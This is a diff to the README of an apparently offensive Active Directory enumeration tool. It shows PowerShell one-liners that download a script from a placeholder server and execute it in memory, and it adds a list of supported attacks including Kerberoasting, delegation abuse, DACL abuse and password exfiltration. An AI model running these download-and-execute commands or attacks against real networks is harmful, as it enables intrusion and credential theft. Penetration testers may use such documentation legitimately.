@@ -21,3 +21,14 @@ iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-FullEnum
 iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-AdminEnum
 ```
 Keep in mind you also have access to all the functions of the above mentioned scripts. 
+
+## What does it do?
+
+ADEN currently supports the following attack scenarios:
+
+- ASREPRoasting / Kerberoasting
+- Unconstrained / Constrained / Resource Based Delegations
+- Linked MSSQL Instances Abuse
+- DACL Abuse
+- Local Admin Access
+- GPP / LAPS / LDAP Password exfiltration
